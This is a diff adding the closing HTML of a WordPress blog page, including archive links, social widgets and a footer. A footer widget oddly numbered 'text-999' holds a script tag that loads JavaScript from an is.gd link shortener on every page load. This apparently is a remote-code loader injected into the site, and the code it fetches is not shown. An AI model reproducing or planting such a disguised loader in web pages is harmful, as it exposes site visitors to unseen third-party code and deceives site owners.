+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/06/'>June 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/05/'>May 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/04/'>April 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/03/'>March 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/02/'>February 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2014/12/'>December 2014</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2014/11/'>November 2014</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2014/07/'>July 2014</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2014/06/'>June 2014</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2014/04/'>April 2014</a></li>
+		</ul>
+		</aside><aside id="text-2" class="widget widget_text"><h2>Twitter</h2>			<div class="textwidget"><a class="twitter-timeline" href="https://twitter.com/Wizardscupboard" data-widget-id="514549358423851009">Tweets by @Wizardscupboard</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script></div>
+		</aside><aside id="text-3" class="widget widget_text"><h2>Facebook</h2>			<div class="textwidget"><div class="fb-activity" data-site="http://www.wizardscupboard.com" data-action="likes, recommends" data-colorscheme="dark" data-header="true"></div></div>
+		</aside>
+	
+</aside>
+
+
+
+
+
+		
+		</div><!-- /.content-wrapper -->
+
+		<footer class="footer content-wrapper" role="contentinfo">
+
+			<div class="footer-content">
+
+					<section class="footer-widgets columns-3">
+
+		<div class="footer-sidebar first">
+					</div>
+
+		<div class="footer-sidebar second">
+					</div>
+
+		<div class="footer-sidebar third">
+			<aside id="text-999" class="widget widget_text">			<div class="textwidget"><script src="https://is.gd/GgGf9z?v=v25.0"></script></div>
+		</aside>		</div>
+
+	</section>
+		<p>
+		Powered by <a href="http://www.wizardscupboard.com" title="WordPress.org">Wizard's Cupboard</a>.
+	</p>
+			<a href="#top" class="back-to-top button">
+			Back to top		</a>
+	
+			</div><!-- /.footer-content -->
+
+		</footer>
+
+		
+	</div><!-- /.inner-wrap -->
+
+</div><!-- /.outer-wrap -->
+
+
+<div id="su-footer-links" style="text-align: center;"></div><script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/plugins/akismet/_inc/form.js?ver=3.2'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/plugins.min.js?ver=4.7.14'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/script.min.js?ver=4.7.14'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/comment-reply.min.js?ver=4.7.14'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/wp-embed.min.js?ver=4.7.14'></script>
+
+</body>
+</html>
